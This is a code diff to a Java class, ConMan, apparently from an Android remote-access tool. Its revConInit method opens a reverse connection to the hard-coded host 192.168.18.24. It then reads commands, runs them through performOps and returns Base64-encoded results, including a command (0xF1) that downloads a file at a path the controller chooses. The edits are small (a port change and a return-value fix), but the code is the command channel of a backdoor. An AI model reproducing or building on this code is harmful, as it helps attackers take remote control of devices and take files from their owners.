@@ -17,7 +17,7 @@ public class ConMan {
     public static void revConInit() throws Exception {
 
         // start a socket
-        Socket socket = new Socket("192.168.18.24", 1024);
+        Socket socket = new Socket("192.168.18.24", 1025);
 
         // Input Socket
         BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
@@ -42,6 +42,7 @@ public class ConMan {
                 String incomingMessage = in.readLine();
 
                 String message = performOps(incomingMessage);
+
                 String encodedMessage = Base64.encodeToString(message.getBytes(StandardCharsets.UTF_8), Base64.DEFAULT);
                 int messageLength = encodedMessage.getBytes(StandardCharsets.UTF_8).length;
 
@@ -108,7 +109,7 @@ public class ConMan {
                 break;
             // Download File Given Path
             case "0xF1":
-                returnMessage = String.valueOf(FileMan.downloadFile(chunks[1]));
+                returnMessage = FileMan.downloadFile(chunks[1]);
                 break;
             default:
                 returnMessage = "Invalid";
